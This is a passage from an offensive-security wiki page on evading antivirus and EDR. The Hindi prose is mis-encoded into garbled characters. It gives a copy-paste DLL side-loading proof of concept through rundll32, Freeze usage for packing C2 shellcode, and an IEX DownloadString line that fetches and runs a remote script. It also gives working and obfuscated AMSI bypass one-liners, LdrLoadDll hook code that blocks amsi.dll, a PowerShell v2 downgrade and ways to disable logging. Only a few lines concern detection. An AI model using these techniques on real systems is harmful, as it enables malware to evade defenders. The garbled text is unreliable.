`NCRYPTPROV.dll` KnownDLL рдирд╣реАрдВ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рдЦреЛрдЬ рдХреНрд░рдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдвреВрдБрдврдХрд░ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

PoC (рдХреЙрдкреА-рдкреЗрд╕реНрдЯ):
1) рд╕рд╛рдЗрди рдХрд┐рдП рдЧрдП рд╕рд┐рд╕реНрдЯрдо DLL рдХреЛ рдПрдХ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдХреЙрдкреА рдХрд░реЗрдВ
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) рдЙрд╕реА рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдПрдХ malicious `NCRYPTPROV.dll` рд░рдЦреЗрдВред рдПрдХ рдиреНрдпреВрдирддрдо DllMain рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╣реИ; DllMain рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП forwarded function рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) рд╕рд╛рдЗрди рдХрд┐рдП рдЧрдП LOLBin рдХреЗ рд╕рд╛рде рдлрд╝реЙрд░рд╡рд░реНрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
рдкреНрд░реЗрдХреНрд╖рд┐рдд рд╡реНрдпрд╡рд╣рд╛рд░:
- rundll32 (рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рд╣реБрдЖ) side-by-side `keyiso.dll` (рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рд╣реБрдЖ) рдХреЛ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ
- рдЬрдм `KeyIsoSetAuditingInterface` рдХреЛ рд░рд┐рдЬрд╝реЙрд▓реНрд╡ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рд▓реЛрдбрд░ рдлреЙрд░рд╡рд░реНрдб `NCRYPTPROV.SetAuditingInterface` рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реИ
- рдлрд┐рд░ рд▓реЛрдбрд░ `NCRYPTPROV.dll` рдХреЛ `C:\test` рд╕реЗ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ `DllMain` рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ
- рдпрджрд┐ `SetAuditingInterface` рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдкрдХреЛ "missing API" рддреНрд░реБрдЯрд┐ рдХреЗрд╡рд▓ рддрдм рдорд┐рд▓реЗрдЧреА рдЬрдм `DllMain` рдкрд╣рд▓реЗ рд╣реА рдЪрд▓ рдЪреБрдХрд╛ рд╣реЛрдЧрд╛

рд╣рдВрдЯрд┐рдВрдЧ рдЯрд┐рдкреНрд╕:
- рдЙрди рдлреЙрд░рд╡рд░реНрдб рдХрд┐рдП рдЧрдП рдПрдХреНрд╕рдкреЛрд░реНрдЯреНрд╕ рдкрд░ рдзреНрдпрд╛рди рджреЗрдВ рдЬрд╣рд╛рдБ рд▓рдХреНрд╖реНрдп рдореЙрдбреНрдпреВрд▓ KnownDLL рдирд╣реАрдВ рд╣реИред KnownDLLs рдЗрд╕ рд╕реНрдерд╛рди рдкрд░ рд╕реВрдЪреАрдмрджреНрдз рд╣реИрдВ: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- рдЖрдк рдлреЙрд░рд╡рд░реНрдб рдХрд┐рдП рдЧрдП рдПрдХреНрд╕рдкреЛрд░реНрдЯреНрд╕ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЯреВрд▓рд┐рдВрдЧ рд╕реЗ рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Windows 11 forwarder рдЗрдиреНрд╡реЗрдВрдЯрд░реА рджреЗрдЦреЗрдВ рддрд╛рдХрд┐ рдЙрдореНрдореАрджрд╡рд╛рд░ рдЦреЛрдЬ рд╕рдХреЗрдВ: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- LOLBins рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░реЗрдВ (e.g., rundll32.exe) рдЬреЛ non-system paths рд╕реЗ signed DLLs рд▓реЛрдб рдХрд░ рд░рд╣реЗ рд╣реЛрдВ, рдФрд░ рдлрд┐рд░ рдЙрд╕реА рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╕реЗ рдЙрд╕реА base name рд╡рд╛рд▓реЗ non-KnownDLLs рдХреЛ рд▓реЛрдб рдХрд░ рд░рд╣реЗ рд╣реЛрдВ
- рдирд┐рдореНрди process/module chains рдкрд░ рдЕрд▓рд░реНрдЯ рдХрд░реЗрдВ: `rundll32.exe` тЖТ non-system `keyiso.dll` тЖТ `NCRYPTPROV.dll` рдЬреЛ user-writable paths рдХреЗ рддрд╣рдд рд╣реЛрдВ
- code integrity рдиреАрддрд┐рдпрд╛рдБ рд▓рд╛рдЧреВ рдХрд░реЗрдВ (WDAC/AppLocker) рдФрд░ application directories рдореЗрдВ write+execute рдирд┐рд╖реЗрдз рдХрд░реЗрдВ

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

рдЖрдк Freeze рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдкрдиреЗ shellcode рдХреЛ рд▓реЛрдб рдФрд░ execute рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЧреЛрдкрдиреАрдп рддрд░реАрдХреЗ рд╕реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> рдЗрд╡реЗрд╢рди рд╕рд┐рд░реНрдл рдПрдХ рдмрд┐рд▓реНрд▓реА рдФрд░ рдЪреВрд╣реЗ рдХрд╛ рдЦреЗрд▓ рд╣реИ тАФ рдЬреЛ рдЖрдЬ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рд╡рд╣ рдХрд▓ рдкрдХрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдХрднреА рднреА рд╕рд┐рд░реНрдл рдПрдХ рдЯреВрд▓ рдкрд░ рдирд┐рд░реНрднрд░ рди рд░рд╣реЗрдВ; рдЬрд╣рд╛рдБ рд╕рдВрднрд╡ рд╣реЛ, рдХрдИ evasion techniques рдХреЛ рдЪреЗрди рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВред

## AMSI (Anti-Malware Scan Interface)

AMSI рдХреЛ "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ред рд╢реБрд░реБрдЖрдд рдореЗрдВ, AVs рдХреЗрд╡рд▓ **files on disk** рдХреЛ рд╕реНрдХреИрди рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдереЗ, рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдк payloads рдХреЛ рдХрд┐рд╕реА рддрд░рд╣ **directly in-memory** execute рдХрд░ рдкрд╛рддреЗ рдереЗ, рддреЛ AV рдХреБрдЫ рднреА рдХрд░рдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрде рд░рд╣рддрд╛ рдХреНрдпреЛрдВрдХрд┐ рдЙрд╕реЗ рдкрд░реНрдпрд╛рдкреНрдд visibility рдирд╣реАрдВ рдорд┐рд▓рддреА рдереАред

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

рдпрд╣ antivirus solutions рдХреЛ script рд╡реНрдпрд╡рд╣рд╛рд░ рдХреА рдЬрд╛рдБрдЪ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ script рдХреА contents рдХреЛ unencrypted рдФрд░ unobfuscated рд░реВрдк рдореЗрдВ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рддрд╛ рд╣реИред

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` Windows Defender рдкрд░ рдирд┐рдореНрди alert рдЙрддреНрдкрдиреНрди рдХрд░реЗрдЧрд╛ред

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ `amsi:` рдХреЛ prepend рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЙрд╕ executable рдХрд╛ path рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ script рдЪрд▓рд╛ рдерд╛ тАФ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, powershell.exe

рд╣рдордиреЗ рдХреЛрдИ file disk рдкрд░ drop рдирд╣реАрдВ рдХрд┐рдпрд╛, рдлрд┐рд░ рднреА AMSI рдХреА рд╡рдЬрд╣ рд╕реЗ in-memory рдкрдХрдбрд╝реЗ рдЧрдПред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **.NET 4.8** рд╕реЗ рд╢реБрд░реВ рд╣реЛрдХрд░, C# code рднреА AMSI рдХреЗ рдЬрд░рд┐рдП run рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ `Assembly.Load(byte[])` рдЬреИрд╕реА in-memory рд▓реЛрдбрд┐рдВрдЧ рдХреЛ рднреА рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдк AMSI рд╕реЗ рдмрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ in-memory execution рдХреЗ рд▓рд┐рдП lower versions of .NET (рдЬреИрд╕реЗ 4.7.2 рдпрд╛ рдЙрд╕рд╕реЗ рдиреАрдЪреЗ) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред

There are a couple of ways to get around AMSI:

- **Obfuscation**

  рдЪреВрдБрдХрд┐ AMSI рдореБрдЦреНрдпрддрдГ static detections рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЬрд┐рди scripts рдХреЛ рдЖрдк рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ рдЙрдиреНрд╣реЗрдВ modify рдХрд░рдирд╛ detection рд╕реЗ рдмрдЪрдиреЗ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

  рд╣рд╛рд▓рд╛рдВрдХрд┐, AMSI рдореЗрдВ scripts рдХреЛ unobfuscate рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИ рднрд▓реЗ рд╣реА рд╡реЗ рдХрдИ layers рдореЗрдВ рд╣реЛрдВ, рдЗрд╕рд▓рд┐рдП obfuscation рддрд░реАрдХрд╛ рдФрд░ рдЙрд╕рдХреА рдЧреБрдгрд╡рддреНрддрд╛ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реБрдП рдпрд╣ рдЦрд░рд╛рдм рд╡рд┐рдХрд▓реНрдк рднреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдЗрд╕реЗ рдЖрд╕рд╛рди рдирд╣реАрдВ рдмрдирд╛рддрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐ рдХрднреА-рдХрднреА рдмрд╕ рдХреБрдЫ variable names рдмрджрд▓ рджреЗрдиреЗ рд╕реЗ рдХрд╛рдо рдЪрд▓ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕реА рдЪреАрдЬрд╝ рдХреЛ рдХрд┐рддрдирд╛ рдлреНрд▓реИрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

- **AMSI Bypass**

  рдЪреВрдБрдХрд┐ AMSI рдХреЛ powershell (рд╕рд╛рде рд╣реА cscript.exe, wscript.exe, рдЖрджрд┐) process рдореЗрдВ рдПрдХ DLL рд▓реЛрдб рдХрд░рдХреЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕реЗ unprivileged user рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЖрд╕рд╛рдиреА рд╕реЗ tamper рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред AMSI рдХреЗ implementation рдХреА рдЗрд╕ рдХрдореА рдХреЗ рдХрд╛рд░рдг researchers рдиреЗ AMSI scanning рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рдЦреЛрдЬ рдирд┐рдХрд╛рд▓реЗ рд╣реИрдВред

**Forcing an Error**

AMSI рдХреЗ initialization рдХреЛ fail рдХрд░рд╛рдиреЗ рдкрд░ (amsiInitFailed) рд╡рд░реНрддрдорд╛рди process рдХреЗ рд▓рд┐рдП рдХреЛрдИ scan initiate рдирд╣реАрдВ рд╣реЛрдЧрд╛ред рдЗрд╕реЗ рдореВрд▓ рд░реВрдк рд╕реЗ [Matt Graeber](https://twitter.com/mattifestation) рдиреЗ рдбрд┐рд╕реНрдХреНрд▓реЛрдЬрд╝ рдХрд┐рдпрд╛ рдерд╛ рдФрд░ Microsoft рдиреЗ рдЗрд╕рдХреЗ рд╡реНрдпрд╛рдкрдХ рдЙрдкрдпреЛрдЧ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ signature рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдпрд╛ рд╣реИред
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
рд╡рд░реНрддрдорд╛рди powershell process рдХреЗ рд▓рд┐рдП AMSI рдХреЛ рдЕрдиреБрдкрдпреЛрдЧреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ рдПрдХ рд▓рд╛рдЗрди powershell рдХреЛрдб рд╣реА рдХрд╛рдлреА рдереАред рдпрд╣ рд▓рд╛рдЗрди рд╕реНрд╡рд╛рднрд╛рд╡рд┐рдХ рд░реВрдк рд╕реЗ AMSI рджреНрд╡рд╛рд░рд╛ рдлреНрд▓реИрдЧ рдХреА рдЬрд╛ рдЪреБрдХреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕ technique рдХреЛ рдЙрдкрдпреЛрдЧ рдореЗрдВ рд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╕рдВрд╢реЛрдзрди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

рдиреАрдЪреЗ рдПрдХ рд╕рдВрд╢реЛрдзрд┐рдд AMSI bypass рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ рдореИрдВрдиреЗ рдЗрд╕ [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) рд╕реЗ рд▓рд┐рдпрд╛ рд╣реИред
```bash
Try{#Ams1 bypass technic n┬║ 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.M├В┬гn├В┬гg' + 'e@+nt.Auto@' + '├В┬гtion.A' -join ''
$fdx = '@ms' + '├В┬гIn├В┬г' + 'tF@├В┬г' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('├В┬г','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('├В┬г','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
рдзреНрдпрд╛рди рд░рдЦреЗрдВ, рдпрд╣ рдкреЛрд╕реНрдЯ рдкреНрд░рдХрд╛рд╢рд┐рдд рд╣реЛрддреЗ рд╣реА рд╕рдВрднрд╡рддрдГ рдлреНрд▓реИрдЧ рд╣реЛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдкрдХрд╛ рдордХрд╕рдж рдЕрдирдбрд┐рдЯреЗрдХреНрдЯреЗрдб рд░рд╣рдирд╛ рд╣реИ рддреЛ рдХреЛрдИ рднреА рдХреЛрдб рдкреНрд░рдХрд╛рд╢рд┐рдд рди рдХрд░реЗрдВред

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> рдХреГрдкрдпрд╛ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреЗ рд▓рд┐рдП [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) рдкрдврд╝реЗрдВред

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### AMSI рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рдирд╛ тАФ amsi.dll рд▓реЛрдб рдХреЛ рд░реЛрдХрдирд╛ (LdrLoadDll hook)

AMSI рддрднреА рдЖрд░рдореНрдн рд╣реЛрддрд╛ рд╣реИ рдЬрдм `amsi.dll` рд╡рд░реНрддрдорд╛рди рдкреНрд░реЛрд╕реЗрд╕ рдореЗрдВ рд▓реЛрдб рд╣реЛ рдЪреБрдХрд╛ рд╣реЛрддрд╛ рд╣реИред рдПрдХ рдордЬрдмреВрдд, languageтАСagnostic bypass рдпрд╣ рд╣реИ рдХрд┐ `ntdll!LdrLoadDll` рдкрд░ userтАСmode hook рд▓рдЧрд╛рдпрд╛ рдЬрд╛рдП рдЬреЛ requested module `amsi.dll` рд╣реЛрдиреЗ рдкрд░ error рд▓реМрдЯрд╛рддрд╛ рд╣реИред рдирддреАрдЬрддрди, AMSI рдХрднреА рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрддрд╛ рдФрд░ рдЙрд╕ рдкреНрд░реЛрд╕реЗрд╕ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рд╕реНрдХреИрди рдирд╣реАрдВ рд╣реЛрддрд╛ред

рдЗрдореНрдкреНрд▓реАрдореЗрдВрдЯреЗрд╢рди рд░реВрдкрд░реЗрдЦрд╛ (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found тЖТ AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14тАСbyte jmp thunk
}
```
рдиреЛрдЯреНрд╕
- PowerShell, WScript/CScript рдФрд░ рдХрд╕реНрдЯрдо рд▓реЛрдбрд░реНрд╕ рджреЛрдиреЛрдВ рдкрд░ рд╕рдорд╛рди рд░реВрдк рд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ (рдХреЛрдИ рднреА рдЪреАрдЬрд╝ рдЬреЛ AMSI рдХреЛ рд▓реЛрдб рдХрд░рддреА)ред
- рд▓рдВрдмреЗ рдХрдорд╛рдВрдбтАСрд▓рд╛рдЗрди рдЕрд╡рд╢реЗрд╖реЛрдВ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП stdin рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдлрд╝реАрдб рдХрд░рдиреЗ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ (`PowerShell.exe -NoProfile -NonInteractive -Command -`)ред
- LOLBins рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд▓реЛрдбрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддреЗ рджреЗрдЦрд╛ рдЧрдпрд╛ рд╣реИ (рдЙрджрд╛., `regsvr32` рдЬреЛ `DllRegisterServer` рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ)ред

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**рдбрд┐рдЯреЗрдХреНрдЯ рдХреА рдЧрдИ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╣рдЯрд╛рдПрдВ**

рдЖрдк **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** рдФрд░ **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** рдЬреИрд╕реЗ рдЯреВрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡рд░реНрддрдорд╛рди рдкреНрд░реЛрд╕реЗрд╕ рдХреА рдореЗрдореЛрд░реА рд╕реЗ рдбрд┐рдЯреЗрдХреНрдЯ рдХреА рдЧрдИ AMSI рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╣рдЯрд╛рдИ рдЬрд╛ рд╕рдХреЗред рдпрд╣ рдЯреВрд▓ рд╡рд░реНрддрдорд╛рди рдкреНрд░реЛрд╕реЗрд╕ рдХреА рдореЗрдореЛрд░реА рдореЗрдВ AMSI рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХреЛ рд╕реНрдХреИрди рдХрд░рдХреЗ рдлрд┐рд░ рдЙрд╕реЗ NOP рдирд┐рд░реНрджреЗрд╢реЛрдВ рд╕реЗ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡рд╣ рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рдореЗрдореЛрд░реА рд╕реЗ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

**AV/EDR рдЙрддреНрдкрд╛рдж рдЬреЛ AMSI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ**

AV/EDR рдЙрддреНрдкрд╛рджреЛрдВ рдХреА рд╕реВрдЪреА рдЬреЛ AMSI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЖрдк **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** рдкрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

**PowerShell version 2 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ**
рдпрджрд┐ рдЖрдк PowerShell version 2 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ AMSI рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдЖрдк рдЕрдкрдиреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрд┐рдирд╛ AMSI рджреНрд╡рд╛рд░рд╛ рд╕реНрдХреИрди рдХрд┐рдП рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдРрд╕рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
powershell.exe -version 2
```
## PS рд▓реЙрдЧрд┐рдВрдЧ

PowerShell logging рдПрдХ рдлреАрдЪрд░ рд╣реИ рдЬреЛ рдЖрдкрдХреЛ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╕рднреА PowerShell рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рд▓реЙрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрд╣ рдСрдбрд┐рдЯрд┐рдВрдЧ рдФрд░ рдЯреНрд░рдмрд▓рд╢реВрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдЙрди рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЗ рд▓рд┐рдП рднреА рдПрдХ **рд╕рдорд╕реНрдпрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ detection рд╕реЗ рдмрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**ред

PowerShell logging рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рддрд░реАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

- **PowerShell Transcription рдФрд░ Module Logging рдХреЛ Disable рдХрд░реЗрдВ**: рдЖрдк рдЗрд╕рдХреЗ рд▓рд┐рдП [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) рдЬреИрд╕реЗ tool рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
